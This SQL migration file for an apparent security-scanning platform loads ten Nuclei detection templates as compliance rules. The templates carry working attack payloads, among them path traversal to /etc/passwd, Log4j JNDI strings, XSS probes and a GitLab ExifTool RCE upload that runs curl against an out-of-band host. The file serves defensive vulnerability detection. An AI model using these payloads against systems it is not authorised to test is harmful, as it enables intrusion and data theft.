
-- -----------------
-- image repo setting
-- -----------------

CREATE TABLE IF NOT EXISTS `image_repo_setting` (
    `id`                         varchar(50)        NOT NULL COMMENT 'ID',
    `repo_id`                    varchar(50)        DEFAULT NULL COMMENT '镜像仓库ID',
    `repo`                       varchar(512)       DEFAULT NULL COMMENT 'repository 仓库地址',
    `repo_old`                   varchar(512)       DEFAULT NULL COMMENT 'repository 旧仓库地址',
    `create_time`                bigint             DEFAULT NULL COMMENT '创建时间',
    `update_time`                bigint             DEFAULT NULL COMMENT '修改时间',
    PRIMARY KEY (`id`)
    ) ENGINE = InnoDB DEFAULT CHARSET = utf8mb4 COLLATE = utf8mb4_bin;

-- -----------------
-- nuclei rule
-- -----------------

INSERT INTO `rule` (`id`, `name`, `status`, `severity`, `description`, `script`, `parameter`, `plugin_id`, `plugin_name`, `plugin_icon`, `last_modified`, `flag`, `scan_type`, `suggestion`) VALUES ('8909fff6-52a4-433c-9504-476149acf15c', 'Nuclei Sangfor BA - 远程代码执行检测', 1, 'LowRisk', 'Nuclei Sangfor BA - 远程代码执行检测，深信服产品允许远程未经身份验证的用户使产品执行任意命令。无返回结果属于合规，否则属于\"不合规\"', 'id: sangfor-ba-rce\n\ninfo:\n  name: Sangfor BA - Remote Code Execution\n  author: ritikchaddha\n  severity: critical\n  description: |\n    Sangfor products allow remote unauthenticated users to cause the product to execute arbitrary commands.\n  reference:\n    - https://mobile.twitter.com/sec715/status/1406886851072253953\n  classification:\n    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H\n    cvss-score: 10.0\n    cwe-id: CWE-77\n  metadata:\n    verified: true\n    fofa-query: app=\"sangfor\"\n  tags: rce,sangfor\n\nrequests:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/tool/log/c.php?strip_slashes=md5&host={{randstr}}\"\n\n    matchers-condition: and\n    matchers:\n      - type: word\n        part: body\n        words:\n          - \'{{md5(\"{{randstr}}\")}}\'\n\n      - type: status\n        status:\n          - 200\n\n# Enhanced by mp on 2022/05/30', '[]', 'hummer-nuclei-plugin', 'Nuclei', 'nuclei.png', concat(unix_timestamp(now()), '001'), 1, 'nuclei', NULL);
INSERT INTO `rule` (`id`, `name`, `status`, `severity`, `description`, `script`, `parameter`, `plugin_id`, `plugin_name`, `plugin_icon`, `last_modified`, `flag`, `scan_type`, `suggestion`) VALUES ('6f3a9f9b-6d84-482d-a91a-3fb94f888a34', 'Nuclei Oracle 电子商务套件 — 跨站点脚本检测', 1, 'LowRisk', 'Nuclei Oracle 电子商务套件 — 跨站点脚本检测，无返回结果属于合规，否则属于\"不合规\"', 'id: oracle-ebs-xss\n\ninfo:\n  name: Oracle E-Business Suite - Cross-Site Scripting\n  author: dhiyaneshDk\n  severity: medium\n  reference:\n    - https://www.blackhat.com/docs/us-16/materials/us-16-Litchfield-Hackproofing-Oracle-eBusiness-Suite.pdf\n    - http://www.davidlitchfield.com/AssessingOraclee-BusinessSuite11i.pdf\n  tags: oracle,xss,ebs\n\nrequests:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/OA_HTML/jtfLOVInProcess.jsp%3FAAA%3DAAAAAAAAAA%27%22%3E%3Csvg%2Fonload%3Dalert(\'{{randstr}}\')%3E\"\n      - \"{{BaseURL}}/OA_HTML/oksAutoRenewalHelp.jsp%3Fthanks%3D%27%22%3E%3Csvg%2Fonload%3Dalert(\'{{randstr}}\')%3E\"\n      - \"{{BaseURL}}/OA_HTML/ieuiMeetingErrorDisplay.jsp%3FErrCode%3D%27%22%3E%3Csvg%2Fonload%3Dalert(\'{{randstr}}\')%3E\"\n\n    matchers-condition: and\n    matchers:\n      - type: word\n        words:\n          - \"<svg/onload=alert(\'{{randstr}}\')>\"\n        part: body\n\n      - type: status\n        status:\n          - 200\n      - type: word\n        words:\n          - \"text/html\"\n        part: header\n\n# Enhanced by md on 2022/09/19', '[]', 'hummer-nuclei-plugin', 'Nuclei', 'nuclei.png', concat(unix_timestamp(now()), '001'), 1, 'nuclei', NULL);
INSERT INTO `rule` (`id`, `name`, `status`, `severity`, `description`, `script`, `parameter`, `plugin_id`, `plugin_name`, `plugin_icon`, `last_modified`, `flag`, `scan_type`, `suggestion`) VALUES ('459391ef-3f77-4f13-bade-ecb263f12623', 'Nuclei Atlassian Jira Service Desk 注册检测', 1, 'LowRisk', 'Nuclei Atlassian Jira Service Desk 注册检测，此 Atlassian JIRA 实例配置错误，允许攻击者仅通过导航到可通过 URL /servicedesk/customer/user/signup 访问的注册页面来注册（创建新帐户）。 攻击者创建新帐户后，他/她就有可能访问支持门户。 无返回结果属于合规，否则属于\"不合规\"', 'id: jira-servicedesk-signup\n\ninfo:\n  name: Atlassian Jira Service Desk Signup\n  author: TechbrunchFR\n  severity: medium\n  description:\n    This instance of Atlassian JIRA is misconfigured to allow an attacker to sign up (create a new account) just by navigating to the signup page that is accessible at the URL /servicedesk/customer/user/signup. After the attacker has created a new account it\'s possible for him/her to access the support portal.\n  reference:\n    - https://www.acunetix.com/vulnerabilities/web/atlassian-jira-servicedesk-misconfiguration/\n  metadata:\n    shodan-query: http.component:\"Atlassian Jira\"\n  classification:\n    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N\n    cvss-score: 6.1\n    cwe-id: CWE-287\n  tags: atlassian,servicedesk,jira,confluence\n\nrequests:\n  - raw:\n      - |\n        GET /servicedesk/customer/user/signup HTTP/1.1\n        Host: {{Hostname}}\n\n      - |\n        POST /servicedesk/customer/user/signup HTTP/1.1\n        Host: {{Hostname}}\n        Content-Type: application/json\n        Origin: {{RootURL}}\n        Referer: {{RootURL}}/servicedesk/customer/user/signup\n\n        {\"email\":\"\",\"fullname\":\"{{randstr}}\",\"password\":\"\",\"captcha\":\"\",\"secondaryEmail\":\"\"}\n\n      - |\n        GET /secure/Signup!default.jspa HTTP/1.1\n        Host: {{Hostname}}\n\n      - |\n        POST /secure/Signup.jspa HTTP/1.1\n        Host: {{Hostname}}\n        Content-Type: application/x-www-form-urlencoded\n        Origin: {{RootURL}}\n        Referer: {{RootURL}}/secure/Signup.jspa\n\n        email=&fullname={{randstr}}&username=&password=&Signup=Sign+up\n\n    cookie-reuse: true\n    stop-at-first-match: true\n    matchers:\n      - type: word\n        words:\n          - \'signup.validation.errors\'\n          - \'signup-username-error\'\n        condition: or', '[]', 'hummer-nuclei-plugin', 'Nuclei', 'nuclei.png', concat(unix_timestamp(now()), '001'), 1, 'nuclei', NULL);
INSERT INTO `rule` (`id`, `name`, `status`, `severity`, `description`, `script`, `parameter`, `plugin_id`, `plugin_name`, `plugin_icon`, `last_modified`, `flag`, `scan_type`, `suggestion`) VALUES ('74b273eb-2611-45dd-8a2d-19fb2a41856c', 'Nuclei Jenkins - 远程代码执行检测', 1, 'LowRisk', 'Nuclei Jenkins - 远程代码执行检测，由于可访问的脚本功能，Jenkins 容易受到远程代码执行漏洞的影响。 无返回结果属于合规，否则属于\"不合规\"', 'id: jenkins-script\n\ninfo:\n  name: Jenkins - Remote Code Execution\n  author: philippedelteil\n  severity: critical\n  description: |\n    Jenkins is susceptible to a remote code execution vulnerability due to accessible script functionality.\n  reference:\n    - https://hackerone.com/reports/403402\n  classification:\n    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H\n    cvss-score: 10.0\n    cwe-id: CWE-77\n  tags: devops,hackerone,jenkins,rce\n\nrequests:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/script/\"\n\n    matchers-condition: and\n    matchers:\n      - type: word\n        part: body\n        words:\n          - \"println(Jenkins.instance.pluginManager.plugins)\"\n\n      - type: word\n        part: body\n        words:\n          - \"Script Console\"\n          - \"Scriptconsole\"\n        condition: or\n\n      - type: status\n        status:\n          - 200\n\n# Enhanced by mp on 2022/05/26', '[]', 'hummer-nuclei-plugin', 'Nuclei', 'nuclei.png', concat(unix_timestamp(now()), '001'), 1, 'nuclei', NULL);
INSERT INTO `rule` (`id`, `name`, `status`, `severity`, `description`, `script`, `parameter`, `plugin_id`, `plugin_name`, `plugin_icon`, `last_modified`, `flag`, `scan_type`, `suggestion`) VALUES ('24c83ca0-79d8-4b13-b2ca-1ab26d17565f', 'Nuclei Liferay - 通过 I18nServlet 的资源泄漏检测', 1, 'LowRisk', 'Nuclei Liferay - 通过 I18nServlet 的资源泄漏检测，I18n Servlet 通过向 /[language]/[resource];.js（.jsp 也有效）发送 HTTP 请求来泄露信息。 无返回结果属于合规，否则属于\"不合规\"', 'id: liferay-resource-leak\n\ninfo:\n  name: Liferay - Resource leakage through I18nServlet\n  author: DhiyaneshDk\n  severity: high\n  description: |\n    I18n Servlet leaks information by sending an HTTP request to /[language]/[resource];.js (also .jsp works).\n  remediation: Update Liferay to the latest version\n  reference:\n    - https://github.com/ilmila/J2EEScan/blob/master/src/main/java/burp/j2ee/issues/impl/LiferayI18nServletResourceLeaks.java\n  metadata:\n    verified: true\n    shodan-query: title:\"Liferay\"\n  tags: liferay,lfi,j2ee\n\nrequests:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/en/WEB-INF/web.xml;.js\"\n\n    matchers-condition: and\n    matchers:\n      - type: word\n        part: body\n        words:\n          - \"<web-app id=\"\n          - \"<?xml\"\n        condition: and\n\n      - type: word\n        part: header\n        words:\n          - \"application/xml\"\n\n      - type: status\n        status:\n          - 200', '[]', 'hummer-nuclei-plugin', 'Nuclei', 'nuclei.png', concat(unix_timestamp(now()), '001'), 1, 'nuclei', NULL);
INSERT INTO `rule` (`id`, `name`, `status`, `severity`, `description`, `script`, `parameter`, `plugin_id`, `plugin_name`, `plugin_icon`, `last_modified`, `flag`, `scan_type`, `suggestion`) VALUES ('f35a7c3a-ca31-4f78-9cbc-d71c4d00ec9a', 'Nuclei Grafana 8.x - 本地文件检测', 1, 'LowRisk', 'Nuclei Grafana 8.x - 本地文件检测，Grafana 8.x 容易受到本地文件的影响。 无返回结果属于合规，否则属于\"不合规\"', 'id: grafana-file-read\n\ninfo:\n  name: Grafana 8.x - Local File Inclusion\n  author: z0ne,dhiyaneshDk,jeya.seelan,dwisiswant0\n  severity: high\n  description: Grafana 8.x is vulnerable to local file inclusion.\n  reference:\n    - https://grafana.com/blog/2021/12/08/an-update-on-0day-cve-2021-43798-grafana-directory-traversal/\n    - https://nosec.org/home/detail/4914.html\n    - https://github.com/jas502n/Grafana-VulnTips\n    - https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p\n    - https://twitter.com/naglinagli/status/1468155313182416899\n    - https://nvd.nist.gov/vuln/detail/CVE-2021-43798\n  metadata:\n    shodan-query: title:\"Grafana\"\n  classification:\n    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N\n    cvss-score: 7.5\n    cwe-id: CWE-22\n  tags: grafana,lfi,fuzz\n\nrequests:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/public/plugins/{{pluginSlug}}/../../../../../../../../../../../../../../../../../../../etc/passwd\"\n\n    payloads:\n      pluginSlug: helpers/wordlists/grafana-plugins.txt\n\n    threads: 50\n    stop-at-first-match: true\n    matchers-condition: and\n    matchers:\n\n      - type: regex\n        regex:\n          - \"root:.*:0:0:\"\n\n      - type: status\n        status:\n          - 200\n\n# Enhanced by mp on 2022/07/22', '[]', 'hummer-nuclei-plugin', 'Nuclei', 'nuclei.png', concat(unix_timestamp(now()), '001'), 1, 'nuclei', NULL);
INSERT INTO `rule` (`id`, `name`, `status`, `severity`, `description`, `script`, `parameter`, `plugin_id`, `plugin_name`, `plugin_icon`, `last_modified`, `flag`, `scan_type`, `suggestion`) VALUES ('e25b6814-f4d9-4baf-b3c1-497bdba5575f', 'Nuclei 使用 ExifTool 的 GitLab CE/EE 未经身份验证的 RCE检测', 1, 'LowRisk', 'Nuclei 使用 ExifTool 的 GitLab CE/EE 未经身份验证的 RCE，GitLab CE/EE 包含一个漏洞，允许将特制图像传递给文件解析器以执行命令执行攻击。 受影响的版本介于 11.9-13.8.7、13.9-13.9.5 和 13.10-13.10.2 之间。 无返回结果属于合规，否则属于\"不合规\"', 'id: gitlab-rce\n\ninfo:\n  name: GitLab CE/EE Unauthenticated RCE Using ExifTool\n  author: pdteam\n  severity: critical\n  description: GitLab CE/EE contains a vulnreability which allows a specially crafted image passed to a file parser to perform a command execution attack. Versions impacted are between 11.9-13.8.7, 13.9-13.9.5, and 13.10-13.10.2.\n  reference:\n    - https://security.humanativaspa.it/gitlab-ce-cve-2021-22205-in-the-wild/\n    - https://hackerone.com/reports/1154542\n    - https://nvd.nist.gov/vuln/detail/CVE-2021-22205\n  remediation: Upgrade to versions 13.10.3, 13.9.6, 13.8.8, or higher.\n  classification:\n    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H\n    cvss-score: 10\n    cve-id: CVE-2021-22205\n    cwe-id: CWE-20\n  metadata:\n    shodan-query: http.title:\"GitLab\"\n  tags: oast,intrusive,hackerone,cve,cve2021,gitlab,rce,kev\n\nrequests:\n  - raw:\n      - |\n        GET /users/sign_in HTTP/1.1\n        Host: {{Hostname}}\n        Origin: {{BaseURL}}\n\n      - |\n        POST /uploads/user HTTP/1.1\n        Host: {{Hostname}}\n        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5\n        X-CSRF-Token: {{csrf-token}}\n\n        {{hex_decode(\'0D0A2D2D2D2D2D2D5765624B6974466F726D426F756E64617279494D76336D7852673539546B465358350D0A436F6E74656E742D446973706F736974696F6E3A20666F726D2D646174613B206E616D653D2266696C65223B2066696C656E616D653D22746573742E6A7067220D0A436F6E74656E742D547970653A20696D6167652F6A7065670D0A0D0A41542654464F524D000003AF444A564D4449524D0000002E81000200000046000000ACFFFFDEBF992021C8914EEB0C071FD2DA88E86BE6440F2C7102EE49D36E95BDA2C3223F464F524D0000005E444A5655494E464F0000000A00080008180064001600494E434C0000000F7368617265645F616E6E6F2E696666004247343400000011004A0102000800088AE6E1B137D97F2A89004247343400000004010FF99F4247343400000002020A464F524D00000307444A5649414E546100000150286D657461646174610A0928436F7079726967687420225C0A22202E2071787B\')}}curl `whoami`.{{interactsh-url}}{{hex_decode(\'7D202E205C0A2220622022292029202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020200A0D0A2D2D2D2D2D2D5765624B6974466F726D426F756E64617279494D76336D7852673539546B465358352D2D0D0A\')}}\n\n    cookie-reuse: true\n    max-redirects: 3\n    matchers-condition: and\n    matchers:\n      - type: word\n        words:\n          - \'Failed to process image\'\n\n      - type: status\n        status:\n          - 422\n\n    extractors:\n      - type: regex\n        name: csrf-token\n        internal: true\n        group: 1\n        regex:\n          - \'csrf-token\" content=\"(.*?)\" />\'\n\n      - type: regex\n        part: interactsh_request\n        group: 1\n        regex:\n          - \'([a-z0-9]+)\\.([a-z0-9]+)\\.([a-z0-9]+)\\.([a-z]+)\'\n\n# Enhanced by CS 2021/03/04', '[]', 'hummer-nuclei-plugin', 'Nuclei', 'nuclei.png', concat(unix_timestamp(now()), '001'), 1, 'nuclei', NULL);
INSERT INTO `rule` (`id`, `name`, `status`, `severity`, `description`, `script`, `parameter`, `plugin_id`, `plugin_name`, `plugin_icon`, `last_modified`, `flag`, `scan_type`, `suggestion`) VALUES ('27a7a788-7601-4da6-9daa-42d87446de59', 'Nuclei Apache Code42 - 远程代码执行 (Apache Log4j)检测', 1, 'LowRisk', 'Nuclei Apache Code42 - 远程代码执行 (Apache Log4j)，多个 Code42 组件受到 logj4 漏洞的影响。 无返回结果属于合规，否则属于\"不合规\"', 'id: code42-log4j-rce\n\ninfo:\n  name: Apache Code42 -  Remote Code Execution (Apache Log4j)\n  author: Adam Crosser\n  severity: critical\n  description: |\n    Multiple Code42 components are impacted by the logj4 vulnerability. Affected Code42 components include:\n    - Code42 cloud: Updated Log4j from 2.15.0 to 2.17.1 on January 26, 2022\n    - Code42 app for Incydr Basic and Advanced and CrashPlan Cloud product plans: Updated Log4j from 2.16.0 to 2.17.1 on January 18, 2022\n    - Code42 User Directory Sync (UDS): Updated Log4j from 2.15.0 to 2.17.1 on February 2, 2022\n    - On-premises Code42 server: Mitigated from Log4j vulnerabilities by following these steps\n    - On-premises Code42 app: Updated to Log4j 2.16 on December 17, 2021\n  reference:\n    - https://support.code42.com/Terms_and_conditions/Code42_customer_support_resources/Code42_response_to_industry_security_incidents\n    - https://logging.apache.org/log4j/2.x/security.html\n    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228\n  classification:\n    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H\n    cvss-score: 10\n    cve-id: CVE-2021-44228\n    cwe-id: CWE-77\n  tags: jndi,log4j,rce,cve,cve2021,oast,code42,kev\n\nrequests:\n  - method: GET\n    path:\n      - \'{{BaseURL}}/c42api/v3/LoginConfiguration?username=${jndi:ldap://${hostName}.{{interactsh-url}}/test}&url=https://localhost\'\n\n    matchers-condition: and\n    matchers:\n      - type: word\n        part: interactsh_protocol  # Confirms the DNS Interaction\n        words:\n          - \"dns\"\n\n      - type: regex\n        part: interactsh_request\n        regex:\n          - \'([a-zA-Z0-9\\.\\-]+)\\.([a-z0-9]+)\\.([a-z0-9]+)\\.\\w+\'  # Match for extracted ${hostName} variable\n\n    extractors:\n      - type: regex\n        part: interactsh_request\n        group: 1\n        regex:\n          - \'([a-zA-Z0-9\\.\\-]+)\\.([a-z0-9]+)\\.([a-z0-9]+)\\.\\w+\'  # Print extracted ${hostName} in output\n\n# Enhanced by mp on 2022/05/27', '[]', 'hummer-nuclei-plugin', 'Nuclei', 'nuclei.png', concat(unix_timestamp(now()), '001'), 1, 'nuclei', NULL);
INSERT INTO `rule` (`id`, `name`, `status`, `severity`, `description`, `script`, `parameter`, `plugin_id`, `plugin_name`, `plugin_icon`, `last_modified`, `flag`, `scan_type`, `suggestion`) VALUES ('07f96430-ef0b-4209-b918-2cbc2873c15a', 'Nuclei Apache Solr <= 8.8.1 - 本地文件检测', 1, 'LowRisk', 'Nuclei Apache Solr <= 8.8.1 - 本地文件检测，8.8.1 之前的 Apache Solr 版本（包括 8.8.1）容易受到本地文件的攻击。 无返回结果属于合规，否则属于\"不合规\"', 'id: apache-solr-file-read\n\ninfo:\n  name: Apache Solr <= 8.8.1 - Local File Inclusion\n  author: DhiyaneshDk,philippedelteil\n  severity: high\n  description: Apache Solr versions prior to and including 8.8.1 are vulnerable to local file inclusion.\n  reference:\n    - https://twitter.com/Al1ex4/status/1382981479727128580\n    - https://nsfocusglobal.com/apache-solr-arbitrary-file-read-and-ssrf-vulnerability-threat-alert/\n    - https://twitter.com/sec715/status/1373472323538362371\n  classification:\n    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N\n    cvss-score: 7.5\n    cwe-id: CWE-22\n  tags: apache,solr,lfi\n\nrequests:\n  - raw:\n      - |\n        GET /solr/admin/cores?wt=json HTTP/1.1\n        Host: {{Hostname}}\n        Accept-Language: en\n        Connection: close\n\n      - |\n        GET /solr/{{core}}/debug/dump?stream.url=file:///../../../../../Windows/win.ini&param=ContentStream HTTP/1.1\n        Host: {{Hostname}}\n        Accept-Language: en\n        Connection: close\n\n      - |\n        GET /solr/{{core}}/debug/dump?stream.url=file:///etc/passwd&param=ContentStream HTTP/1.1\n        Host: {{Hostname}}\n        Accept-Language: en\n        Connection: close\n\n    stop-at-first-match: true\n    matchers-condition: or\n    matchers:\n      - type: word\n        part: body\n        words:\n          - \"bit app support\"\n          - \"fonts\"\n          - \"extensions\"\n        condition: and\n\n      - type: regex\n        regex:\n          - \"root:.*:0:0:\"\n\n    extractors:\n      - type: regex\n        name: core\n        group: 1\n        regex:\n          - \'\"name\"\\:\"(.*?)\"\'\n        internal: true', '[]', 'hummer-nuclei-plugin', 'Nuclei', 'nuclei.png', concat(unix_timestamp(now()), '001'), 1, 'nuclei', NULL);
INSERT INTO `rule` (`id`, `name`, `status`, `severity`, `description`, `script`, `parameter`, `plugin_id`, `plugin_name`, `plugin_icon`, `last_modified`, `flag`, `scan_type`, `suggestion`) VALUES ('7f1d2c2a-d114-430c-98be-1d1e0619ed23', 'Nuclei JamF Pro - 远程代码执行 (Apache Log4j)检测', 1, 'LowRisk', 'Nuclei JamF Pro - 远程代码执行 (Apache Log4j)检测，JamF 容易受到 Lof4j JNDI 远程代码执行的影响。 无返回结果属于合规，否则属于\"不合规\"', 'id: jamf-pro-log4j-rce\n\ninfo:\n  name: JamF Pro - Remote Code Execution (Apache Log4j)\n  author: DhiyaneshDK,pdteam\n  severity: critical\n  description: |\n    JamF is susceptible to Lof4j JNDI remote code execution. JamF is the industry standard when it comes to the management of iOS devices (iPhones and iPads), macOS computers (MacBooks, iMacs, etc.), and tvOS devices (Apple TV).\n  reference:\n    - https://github.com/random-robbie/jamf-log4j\n    - https://docs.jamf.com/technical-articles/Mitigating_the_Apache_Log4j_2_Vulnerability.html\n    - https://community.connection.com/what-is-jamf/\n    - https://logging.apache.org/log4j/2.x/security.html\n    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228\n  classification:\n    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H\n    cvss-score: 10\n    cve-id: CVE-2021-44228\n    cwe-id: CWE-77\n  metadata:\n    shodan-query: title:\"Jamf Pro\"\n    verified: \"true\"\n  tags: cve,cve2021,rce,jndi,log4j,jamf,oast,kev\n\nrequests:\n  - raw:\n      - |\n        POST / HTTP/1.1\n        Host: {{Hostname}}\n        Origin: {{RootURL}}\n        Referer: {{RootURL}}\n        Content-Type: application/x-www-form-urlencoded\n\n        username=${jndi:ldap://${hostName}.{{interactsh-url}}/test}&password=\n\n    matchers-condition: and\n    matchers:\n      - type: word\n        part: interactsh_protocol  # Confirms the DNS Interaction\n        words:\n          - \"dns\"\n\n      - type: regex\n        part: interactsh_request\n        regex:\n          - \'([a-zA-Z0-9\\.\\-]+)\\.([a-z0-9]+)\\.([a-z0-9]+)\\.\\w+\'  # Match for extracted ${hostName} variable\n\n      - type: word\n        part: body\n        words:\n          - \"<title>Jamf Pro Login</title>\"\n\n    extractors:\n      - type: regex\n        part: interactsh_request\n        group: 1\n        regex:\n          - \'([a-zA-Z0-9\\.\\-]+)\\.([a-z0-9]+)\\.([a-z0-9]+)\\.\\w+\'   # Print extracted ${hostName} in output\n\n# Enhanced by mp on 2022/05/27', '[]', 'hummer-nuclei-plugin', 'Nuclei', 'nuclei.png', concat(unix_timestamp(now()), '001'), 1, 'nuclei', NULL);

INSERT INTO `rule_group_mapping` (`rule_id`, `group_id`) VALUES ('7f1d2c2a-d114-430c-98be-1d1e0619ed23', '18');
INSERT INTO `rule_group_mapping` (`rule_id`, `group_id`) VALUES ('07f96430-ef0b-4209-b918-2cbc2873c15a', '18');
INSERT INTO `rule_group_mapping` (`rule_id`, `group_id`) VALUES ('27a7a788-7601-4da6-9daa-42d87446de59', '18');
INSERT INTO `rule_group_mapping` (`rule_id`, `group_id`) VALUES ('e25b6814-f4d9-4baf-b3c1-497bdba5575f', '18');
INSERT INTO `rule_group_mapping` (`rule_id`, `group_id`) VALUES ('f35a7c3a-ca31-4f78-9cbc-d71c4d00ec9a', '18');
INSERT INTO `rule_group_mapping` (`rule_id`, `group_id`) VALUES ('24c83ca0-79d8-4b13-b2ca-1ab26d17565f', '18');
INSERT INTO `rule_group_mapping` (`rule_id`, `group_id`) VALUES ('74b273eb-2611-45dd-8a2d-19fb2a41856c', '18');
INSERT INTO `rule_group_mapping` (`rule_id`, `group_id`) VALUES ('459391ef-3f77-4f13-bade-ecb263f12623', '18');
INSERT INTO `rule_group_mapping` (`rule_id`, `group_id`) VALUES ('6f3a9f9b-6d84-482d-a91a-3fb94f888a34', '18');
INSERT INTO `rule_group_mapping` (`rule_id`, `group_id`) VALUES ('8909fff6-52a4-433c-9504-476149acf15c', '18');

INSERT INTO `rule_tag_mapping` (`rule_id`, `tag_key`) VALUES ('7f1d2c2a-d114-430c-98be-1d1e0619ed23', 'safety');
INSERT INTO `rule_tag_mapping` (`rule_id`, `tag_key`) VALUES ('07f96430-ef0b-4209-b918-2cbc2873c15a', 'safety');
INSERT INTO `rule_tag_mapping` (`rule_id`, `tag_key`) VALUES ('27a7a788-7601-4da6-9daa-42d87446de59', 'safety');
INSERT INTO `rule_tag_mapping` (`rule_id`, `tag_key`) VALUES ('e25b6814-f4d9-4baf-b3c1-497bdba5575f', 'safety');
INSERT INTO `rule_tag_mapping` (`rule_id`, `tag_key`) VALUES ('f35a7c3a-ca31-4f78-9cbc-d71c4d00ec9a', 'safety');
INSERT INTO `rule_tag_mapping` (`rule_id`, `tag_key`) VALUES ('24c83ca0-79d8-4b13-b2ca-1ab26d17565f', 'safety');
INSERT INTO `rule_tag_mapping` (`rule_id`, `tag_key`) VALUES ('74b273eb-2611-45dd-8a2d-19fb2a41856c', 'safety');
INSERT INTO `rule_tag_mapping` (`rule_id`, `tag_key`) VALUES ('459391ef-3f77-4f13-bade-ecb263f12623', 'safety');
INSERT INTO `rule_tag_mapping` (`rule_id`, `tag_key`) VALUES ('6f3a9f9b-6d84-482d-a91a-3fb94f888a34', 'safety');
INSERT INTO `rule_tag_mapping` (`rule_id`, `tag_key`) VALUES ('8909fff6-52a4-433c-9504-476149acf15c', 'safety');

INSERT INTO `rule_inspection_report_mapping` (`rule_id`, `report_id`) VALUES ('7f1d2c2a-d114-430c-98be-1d1e0619ed23', '48');
INSERT INTO `rule_inspection_report_mapping` (`rule_id`, `report_id`) VALUES ('07f96430-ef0b-4209-b918-2cbc2873c15a', '48');
INSERT INTO `rule_inspection_report_mapping` (`rule_id`, `report_id`) VALUES ('27a7a788-7601-4da6-9daa-42d87446de59', '48');
INSERT INTO `rule_inspection_report_mapping` (`rule_id`, `report_id`) VALUES ('e25b6814-f4d9-4baf-b3c1-497bdba5575f', '48');
INSERT INTO `rule_inspection_report_mapping` (`rule_id`, `report_id`) VALUES ('f35a7c3a-ca31-4f78-9cbc-d71c4d00ec9a', '48');
INSERT INTO `rule_inspection_report_mapping` (`rule_id`, `report_id`) VALUES ('24c83ca0-79d8-4b13-b2ca-1ab26d17565f', '48');
INSERT INTO `rule_inspection_report_mapping` (`rule_id`, `report_id`) VALUES ('74b273eb-2611-45dd-8a2d-19fb2a41856c', '48');
INSERT INTO `rule_inspection_report_mapping` (`rule_id`, `report_id`) VALUES ('459391ef-3f77-4f13-bade-ecb263f12623', '48');
INSERT INTO `rule_inspection_report_mapping` (`rule_id`, `report_id`) VALUES ('6f3a9f9b-6d84-482d-a91a-3fb94f888a34', '48');
INSERT INTO `rule_inspection_report_mapping` (`rule_id`, `report_id`) VALUES ('8909fff6-52a4-433c-9504-476149acf15c', '48');

-- -----------------
-- k8s rbac
-- -----------------

CREATE TABLE IF NOT EXISTS `cloud_native_source_rbac_node` (
    `id`                         varchar(50)        NOT NULL COMMENT 'ID',
    `k8s_id`                     varchar(50)        DEFAULT NULL COMMENT 'sourceID',
    `name`                       varchar(512)       DEFAULT NULL COMMENT 'name',
    `namespace`                  varchar(512)       DEFAULT NULL COMMENT 'namespace',
    `value`                      int             DEFAULT NULL COMMENT 'value',
    `symbol`                     varchar(512)       DEFAULT NULL COMMENT 'symbol(本地图片引用地址)',
    `symbolSize`                 int             DEFAULT NULL COMMENT 'symbolSize',
    `order`                      bigint             DEFAULT NULL COMMENT 'order',
    `category`                   varchar(128)       DEFAULT NULL COMMENT 'category',
    `create_time`                bigint             DEFAULT NULL COMMENT '创建时间',
    PRIMARY KEY (`id`)
    ) ENGINE = InnoDB DEFAULT CHARSET = utf8mb4 COLLATE = utf8mb4_bin;

CREATE TABLE IF NOT EXISTS `cloud_native_source_rbac_link` (
    `id`                         varchar(50)        NOT NULL COMMENT 'ID',
    `k8s_id`                     varchar(50)        DEFAULT NULL COMMENT 'sourceID',
    `source`                     varchar(50)        DEFAULT NULL COMMENT 'source',
    `target`                     varchar(50)        DEFAULT NULL COMMENT 'target',
    `create_time`                bigint             DEFAULT NULL COMMENT '创建时间',
    PRIMARY KEY (`id`)
    ) ENGINE = InnoDB DEFAULT CHARSET = utf8mb4 COLLATE = utf8mb4_bin;

CREATE TABLE IF NOT EXISTS `cloud_native_source_rbac_relation` (
    `id`                         varchar(50)        NOT NULL COMMENT 'ID',
    `k8s_id`                     varchar(50)        DEFAULT NULL COMMENT 'sourceId',
    `link_id`                    varchar(50)        DEFAULT NULL COMMENT 'linkId',
    `name`                       varchar(512)       DEFAULT NULL COMMENT 'name',
    `create_time`                bigint             DEFAULT NULL COMMENT '创建时间',
    PRIMARY KEY (`id`)
    ) ENGINE = InnoDB DEFAULT CHARSET = utf8mb4 COLLATE = utf8mb4_bin;


-- -----------------
-- server rule
-- -----------------

